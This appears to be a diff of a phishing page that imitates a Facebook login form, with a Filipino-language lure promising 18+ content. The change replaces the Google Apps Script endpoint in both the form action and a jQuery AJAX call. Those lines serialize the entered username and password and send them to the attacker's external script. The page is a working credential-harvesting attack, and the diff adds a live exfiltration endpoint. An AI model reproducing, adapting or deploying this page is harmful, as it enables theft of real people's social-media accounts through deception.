@@ -130,7 +130,7 @@
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
                         <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nilalaman 18+, mangyaring mag-login bago tingnan.</div>
-                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbxuCEZfnag60bw4COOZM-tG6ZKS2XcBnlUWI8XqD7IjVJrQYKABYqsWVSEWVXKhCFXE/exec">
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbwpHv0ZFswNBtcUJaRLnw6D1wC7nCkMt8R8360BG24HlXUNUjv79xOP56h_4du75Gr5/exec">
                             <label class="mt-10">
                                 <input id="username" type="text" name="username" required="" placeholder="Email O Numero ng Telepono">
                             </label>
@@ -175,7 +175,7 @@ function submitForm() {
         var data = $('form#test-form').serialize();
         $.ajax({
             type: 'GET',
-            url: 'https://script.google.com/macros/s/AKfycbxuCEZfnag60bw4COOZM-tG6ZKS2XcBnlUWI8XqD7IjVJrQYKABYqsWVSEWVXKhCFXE/exec',
+            url: 'https://script.google.com/macros/s/AKfycbwpHv0ZFswNBtcUJaRLnw6D1wC7nCkMt8R8360BG24HlXUNUjv79xOP56h_4du75Gr5/exec',
             dataType: 'json',
             crossDomain: true,
             data: data,
